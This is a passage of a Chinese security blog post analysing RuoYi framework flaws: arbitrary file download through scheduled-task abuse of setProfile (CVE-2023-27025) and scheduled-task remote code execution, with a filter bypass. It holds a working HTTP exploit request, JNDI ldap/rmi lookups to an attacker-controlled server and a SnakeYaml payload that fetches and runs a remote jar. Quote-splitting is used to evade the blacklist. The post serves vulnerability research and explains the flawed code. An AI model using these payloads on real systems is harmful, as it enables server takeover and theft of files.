<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/job/add</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>204<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/monitor/job/add<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=63249f2e-0323-46b5-a29f-29be13153080<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-apache"><span class="hljs-attribute">createBy</span>=admin&amp;jobName=CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">27025</span>&amp;jobGroup=DEFAULT&amp;invokeTarget=ruoYiConfig.setProfile(&#x27;C%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>FWindows%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fwin.ini&#x27;)&amp;cronExpression=<span class="hljs-number">0</span>%<span class="hljs-number">2</span>F10+*+*+*+*+%<span class="hljs-number">3</span>F&amp;misfirePolicy=<span class="hljs-number">1</span>&amp;concurrent=<span class="hljs-number">1</span>&amp;status=<span class="hljs-number">0</span>&amp;remark=</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754666886695-bd88f07f-acaf-40df-907a-f675045d5795.png" srcset="/img/loading.gif" lazyload></p>
<p>执行一次定时任务修改<code>profile</code>设置的值；</p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754666961529-228372c3-032f-45ab-ab2a-f1f1017f24d6.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754667007773-9703bbba-475d-4a93-921f-f10eacd595fe.png" srcset="/img/loading.gif" lazyload></p>
<p>通过调度日志可以确定执行成功；然后访问(文件名随意，不以<code>/profile</code>开头即可)</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://192.168.1.10/common/download/resource?resource=info.xml:.zip<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754667141682-b2e2e4a6-1a20-454b-a0c8-4843a1f5e6ee.png" srcset="/img/loading.gif" lazyload></p>
<p>通过定时任务修改为任意路径的文件即可做到下载任意文件；</p>
<h3 id="漏洞分析-10"><a href="#漏洞分析-10" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过分析该接口的函数可以发现，这个文件下载接口是通过获取<code>profile</code>变量的内容拼接<code>resource</code>参数中<code>/profile</code>后的内容进行的文件下载。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 本地资源通用下载</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, HttpServletRequest request, HttpServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-comment">// 禁止目录穿越（过滤..）；文件名后缀白名单过滤；</span><br>        <span class="hljs-keyword">if</span> (!FileUtils.checkAllowDownload(resource))<br>        &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(StringUtils.format(<span class="hljs-string">&quot;资源文件(&#123;&#125;)非法，不允许下载。 &quot;</span>, resource));<br>        &#125;<br>        <span class="hljs-comment">// 本地资源路径（在RuoYi-4.6.0/ruoyi-admin/src/main/resources/application.yml配置）</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> RuoYiConfig.getProfile();<br>        <span class="hljs-comment">// 数据库资源地址</span><br>        <span class="hljs-comment">// localPath 拼接resource参数中/profile后面的内容</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>        <span class="hljs-comment">// 下载名称，获取下载文件名</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br>        response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>        FileUtils.setAttachmentResponseHeader(response, downloadName);<br>        FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (Exception e)<br>    &#123;<br>        log.error(<span class="hljs-string">&quot;下载文件失败&quot;</span>, e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>由于<code>resource</code>参数已经经过了白名单和目录穿越的过滤，比较难实现任意文件下载；</p>
<p>又由于该函数处理的是拼接<code>resource</code>内容中<code>/profile</code>后的内容，如果<code>resource</code>中不包含<code>/profile</code>，那么拼接的内容不就是<code>null</code>了吗？这时如果我们能够自定义<code>profile</code>变量的值，那么我们也可以实现任意文件下载；</p>
<p>虽然没有直接性的接口能够实现自定义<code>profile</code>变量，但是若依框架中存在定时任务，该任务可以调用除过滤方法以外的任意函数和传入任意参数；</p>
<p>在框架源码中寻找，发现存在设置<code>profile</code>变量的函数位于</p>
<p><code>RuoYi-4.6.0/ruoyi-common/src/main/java/com/ruoyi/common/config/RuoYiConfig.java#setProfile</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProfile</span><span class="hljs-params">(String profile)</span><br>&#123;<br>    RuoYiConfig.profile = profile;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>因此，通过设置定时任务<code>ruoYiConfig.setProfile(&#39;C://Windows//win.ini&#39;)</code>执行，将<code>profile</code>变量设置为想要下载的文件的绝对路径；</p>
<p>然后调用接口<code>/common/download/resource</code>，参数<code>resource</code>传入不含<code>/profile</code>的白名单后缀文件记录下载<code>profile</code>定义的绝对路径文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//192.168.1.10/common/download/resource?resource=info.xml:.zip</span><br></code></pre></td></tr></table></figure>

<h1 id="4-定时任务-RCE"><a href="#4-定时任务-RCE" class="headerlink" title="4 定时任务 RCE"></a>4 定时任务 RCE</h1><h2 id="4-1-定时任务-RCE（"><a href="#4-1-定时任务-RCE（" class="headerlink" title="4.1 定时任务 RCE（&lt;V4.6.2）"></a>4.1 定时任务 RCE（&lt;V4.6.2）</h2><h3 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>对于该定时任务 RCE 漏洞需要注意，启动若依的 jdk 版本必须位于 jdk1.8.0-191 以下，因为大于 191 版本的 jdk1.8 已经禁止了远程 ldap 请求，所以无法远程 rce，只能本地复现。</p>
<p>这里采用的复现环境是 jdk1.8.0_121 + ruoyi V4.6.0，采用的是请求 VPS ip 起的 ldap；</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ldap://xx.xxx.xx.xxx:1389/Basic/Command/calc.exe&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754654352580-5e038b62-0132-4fed-9e13-3c5ef587f561.png" srcset="/img/loading.gif" lazyload></p>
<p>这里需要注意，服务器中启动 LDAP 服务的 java 版本要求是 jdk8；</p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754654456752-9d7bb9c0-028d-4c3c-b31f-ba1b64bfaa89.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754654483267-03ffc344-abec-4723-80c0-d0dce906a77b.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754655349280-dd40bebb-f5f5-45d0-89c7-f1a46edb505c.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754654521131-bae3195c-0cf3-477c-a4b8-2c4e0ab3b61f.png" srcset="/img/loading.gif" lazyload></p>
<p>在 V4.6.2 以下的版本是没有进行任何过滤的，所以基本上使用任何方法都能够实现 RCE；</p>
<p>虽然在 V4.6.2 中仅用了 rmi 的远程调用，但是这丝毫不会影响 ldap 的远程调用，依旧随便 RCE；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.jndi.JndiLocatorDelegate.lookup(<span class="hljs-string">&#x27;rmi://xx.xxx.xx.xxx:1389/Calc&#x27;</span>)<br>javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ldap://xx.xxx.xx.xxx:1389/Basic/Command/calc.exe&#x27;</span>)<br>org.yaml.snakeyaml.Yaml.load(<span class="hljs-string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://xx.xx.xxx.xx:1389/yaml-payload.jar&quot;]]]]&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h3 id="漏洞分析-11"><a href="#漏洞分析-11" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>添加定时任务接口对应的处理函数<code>RuoYi-4.6.0/ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysDeptController.java#addSave</code></p>
<p>在 4.6.2 版本以前没有对定时任务做任何过滤，因此可以实现多种方式的命令执行；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 新增保存调度</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Log(title = &quot;定时任务&quot;, businessType = BusinessType.INSERT)</span><br><span class="hljs-meta">@RequiresPermissions(&quot;monitor:job:add&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">addSave</span><span class="hljs-params">(<span class="hljs-meta">@Validated</span> SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException, TaskException<br>&#123;<br>    <span class="hljs-keyword">if</span> (!CronUtils.isValid(job.getCronExpression()))<br>    &#123;<br>        <span class="hljs-keyword">return</span> AjaxResult.error(<span class="hljs-string">&quot;cron表达式不正确&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> toAjax(jobService.insertJob(job));<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 新增任务</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> job 调度信息 调度信息</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Transactional</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">insertJob</span><span class="hljs-params">(SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException, TaskException<br>&#123;<br>    job.setStatus(ScheduleConstants.Status.PAUSE.getValue());<br>    <span class="hljs-type">int</span> <span class="hljs-variable">rows</span> <span class="hljs-operator">=</span> jobMapper.insertJob(job);<br>    <span class="hljs-keyword">if</span> (rows &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-comment">// 创建定时任务</span><br>        ScheduleUtils.createScheduleJob(scheduler, job);<br>    &#125;<br>    <span class="hljs-keyword">return</span> rows;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 创建定时任务</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createScheduleJob</span><span class="hljs-params">(Scheduler scheduler, SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException, TaskException<br>&#123;<br>    <span class="hljs-comment">// 定时任务处理类获取</span><br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Job</span>&gt; jobClass = getQuartzJobClass(job);<br>    <span class="hljs-comment">// 构建job信息</span><br>    <span class="hljs-type">Long</span> <span class="hljs-variable">jobId</span> <span class="hljs-operator">=</span> job.getJobId();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">jobGroup</span> <span class="hljs-operator">=</span> job.getJobGroup();<br>    <span class="hljs-comment">// 新建定时任务，处理类为QuartzJobExecution/QuartzDisallowConcurrentExecution</span><br>    <span class="hljs-type">JobDetail</span> <span class="hljs-variable">jobDetail</span> <span class="hljs-operator">=</span> JobBuilder.newJob(jobClass).withIdentity(getJobKey(jobId, jobGroup)).build();<br>    <span class="hljs-comment">// 表达式调度构建器</span><br>    <span class="hljs-type">CronScheduleBuilder</span> <span class="hljs-variable">cronScheduleBuilder</span> <span class="hljs-operator">=</span> CronScheduleBuilder.cronSchedule(job.getCronExpression());<br>    cronScheduleBuilder = handleCronScheduleMisfirePolicy(job, cronScheduleBuilder);<br>    <span class="hljs-comment">// 按新的cronExpression表达式构建一个新的trigger</span><br>    <span class="hljs-type">CronTrigger</span> <span class="hljs-variable">trigger</span> <span class="hljs-operator">=</span> TriggerBuilder.newTrigger().withIdentity(getTriggerKey(jobId, jobGroup))<br>            .withSchedule(cronScheduleBuilder).build();<br>    <span class="hljs-comment">// 放入参数，运行时的方法可以获取</span><br>    jobDetail.getJobDataMap().put(ScheduleConstants.TASK_PROPERTIES, job);<br>    <span class="hljs-comment">// 判断是否存在</span><br>    <span class="hljs-keyword">if</span> (scheduler.checkExists(getJobKey(jobId, jobGroup)))<br>    &#123;<br>        <span class="hljs-comment">// 防止创建时存在数据问题 先移除，然后在执行创建操作</span><br>        scheduler.deleteJob(getJobKey(jobId, jobGroup));<br>    &#125;<br>    scheduler.scheduleJob(jobDetail, trigger);<br>    <span class="hljs-comment">// 暂停任务</span><br>    <span class="hljs-keyword">if</span> (job.getStatus().equals(ScheduleConstants.Status.PAUSE.getValue()))<br>    &#123;<br>        scheduler.pauseJob(ScheduleUtils.getJobKey(jobId, jobGroup));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在此之前的代码已经实现了定时任务的创建，并设置了定时任务的处理函数为<code>RuoYi-4.6.0/ruoyi-quartz/src/main/java/com/ruoyi/quartz/util/QuartzJobExecution.java#doExecute</code></p>
<p>下面是执行定时任务方法的流程；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 任务调度立即执行一次</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Log(title = &quot;定时任务&quot;, businessType = BusinessType.UPDATE)</span><br><span class="hljs-meta">@RequiresPermissions(&quot;monitor:job:changeStatus&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/run&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">run</span><span class="hljs-params">(SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException<br>&#123;<br>    jobService.run(job);<br>    <span class="hljs-keyword">return</span> success();<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 立即运行任务</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> job 调度信息</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Transactional</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException<br>&#123;<br>    <span class="hljs-type">Long</span> <span class="hljs-variable">jobId</span> <span class="hljs-operator">=</span> job.getJobId();<br>    <span class="hljs-type">SysJob</span> <span class="hljs-variable">tmpObj</span> <span class="hljs-operator">=</span> selectJobById(job.getJobId());<br>    <span class="hljs-comment">// 参数</span><br>    <span class="hljs-type">JobDataMap</span> <span class="hljs-variable">dataMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JobDataMap</span>();<br>    dataMap.put(ScheduleConstants.TASK_PROPERTIES, tmpObj);<br>    <span class="hljs-comment">// 这里开始调用定时任务处理函数</span><br>    scheduler.triggerJob(ScheduleUtils.getJobKey(jobId, tmpObj.getJobGroup()), dataMap);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>位于<code>RuoYi-4.6.0/ruoyi-quartz/src/main/java/com/ruoyi/quartz/util/QuartzJobExecution.java</code>，执行<code>doExecute</code>函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 定时任务处理（允许并发执行）</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ruoyi</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QuartzJobExecution</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQuartzJob</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doExecute</span><span class="hljs-params">(JobExecutionContext context, SysJob sysJob)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        JobInvokeUtil.invokeMethod(sysJob);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>判断执行的目标名称是否为<code>bean</code>，根据相应类型进行执行方法调用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 执行方法</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> sysJob 系统任务</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(SysJob sysJob)</span> <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">invokeTarget</span> <span class="hljs-operator">=</span> sysJob.getInvokeTarget();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">beanName</span> <span class="hljs-operator">=</span> getBeanName(invokeTarget);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> getMethodName(invokeTarget);<br>    List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget);<br>    <span class="hljs-keyword">if</span> (!isValidClassName(beanName))<br>    &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> SpringUtils.getBean(beanName);<br>        invokeMethod(bean, methodName, methodParams);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> Class.forName(beanName).newInstance();<br>        invokeMethod(bean, methodName, methodParams);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>反射调用相应类对应的函数；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 调用任务方法</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> bean 目标对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> methodName 方法名称</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> methodParams 方法参数</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(Object bean, String methodName, List&lt;Object[]&gt; methodParams)</span><br>        <span class="hljs-keyword">throws</span> NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException,<br>        InvocationTargetException<br>&#123;<br>    <span class="hljs-keyword">if</span> (StringUtils.isNotNull(methodParams) &amp;&amp; methodParams.size() &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> bean.getClass().getDeclaredMethod(methodName, getMethodParamsType(methodParams));<br>        method.invoke(bean, getMethodParamsValue(methodParams));<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> bean.getClass().getDeclaredMethod(methodName);<br>        method.invoke(bean);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>以上就是定时任务添加和调用的全流程，在 4.6.2 以前毫无限制，想怎么执行就怎么执行，有相应依赖也可以直接反序列化执行命令；</p>
<h2 id="4-2-定时任务-RCE-bypass1（"><a href="#4-2-定时任务-RCE-bypass1（" class="headerlink" title="4.2 定时任务 RCE bypass1（&lt;V4.7.1）"></a>4.2 定时任务 RCE bypass1（&lt;V4.7.1）</h2><h3 id="漏洞复现-12"><a href="#漏洞复现-12" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>bypass1 的 payload 如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">rmi: org.springframework.jndi.JndiLocatorDelegate.lookup(<span class="hljs-string">&#x27;r&#x27;</span>mi:<span class="hljs-comment">//192.168.10.129:8888/Calc&#x27;)</span><br>ldap: javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ld&#x27;</span>ap:<span class="hljs-comment">//192.168.10.129:8888/#Calc&#x27;)</span><br>SnakeYaml: org.yaml.snakeyaml.Yaml.load(<span class="hljs-string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;ht&#x27;</span>tp:<span class="hljs-comment">//192.168.31.246:8000/yaml-payload.jar&#x27;]]]]&#x27;)</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754749404476-7b5c0ab8-eb30-41e7-80ad-2ec151b586b1.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754749478292-ae82a551-84a2-4163-b666-d3e61e5bf528.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ld&#x27;</span>ap:<span class="hljs-comment">//xx.xx.xxx.xx:1389/Basic/Command/calc.exe&#x27;)</span><br></code></pre></td></tr></table></figure>

